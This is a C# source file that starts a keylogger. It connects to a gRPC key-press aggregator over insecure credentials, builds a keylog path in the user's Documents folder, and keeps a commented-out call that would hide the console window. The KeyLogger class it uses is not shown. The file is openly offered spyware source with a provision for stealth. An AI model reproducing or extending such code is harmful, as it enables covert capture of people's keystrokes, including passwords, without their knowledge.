using Grpc.Core;
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Hooks
{

    class Logger
    {
        ///<summary>
        ///This starts the keylogger.
        ///</summary>
        static void Main(string[] args)
        {
            string addr = "localhost";
            int port = 4567;
            var channel = new Channel(addr, port, Credentials.Insecure);
            var client = HookKeylogger.Base.KerPressAggergator.NewClient(channel);
            // Put an empty keypress to force the setup of the client.
            var handle = GetConsoleWindow();
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) +"\\keylog";
            var kl = new KeyLogger(client);
            // Hide
            //ShowWindow(handle, SW_HIDE);

            Application.Run();
            kl.Deactivate();
            
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}
